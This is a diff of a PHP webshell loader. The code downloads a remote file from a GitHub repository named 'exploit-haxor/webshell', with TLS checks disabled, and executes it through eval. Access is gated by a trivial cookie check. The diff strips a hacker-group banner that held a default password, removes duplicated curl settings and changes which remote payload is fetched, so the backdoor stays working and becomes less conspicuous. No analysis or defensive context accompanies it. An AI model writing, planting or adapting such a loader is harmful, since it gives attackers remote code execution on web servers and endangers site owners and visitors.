@@ -1,15 +1,8 @@
+
 <?php
-/*----------------------------------------------*/
-/////////////////////////////////////// //////////
-///           INDONESIAN HACKER RULES           ///
-///                11/08/2009                   ///
-///            Default pass: kemuye             ///
-///				                                  ///
-//////////////////////////////////////////////////
-/*----------------------------------------------*/
 function is_logged_in()
 {
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang s
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
 }
 
     function geturlsinfo($url)
@@ -25,22 +18,7 @@ function is_logged_in()
             curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
             curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
             curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-            
-curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
 
-
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
             $urls = $cexec($conn);
             curl_close($conn);
         } elseif (function_exists($fgt)) {
@@ -55,7 +33,7 @@ curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php');
     eval('?>' . $a);
 
 ?>
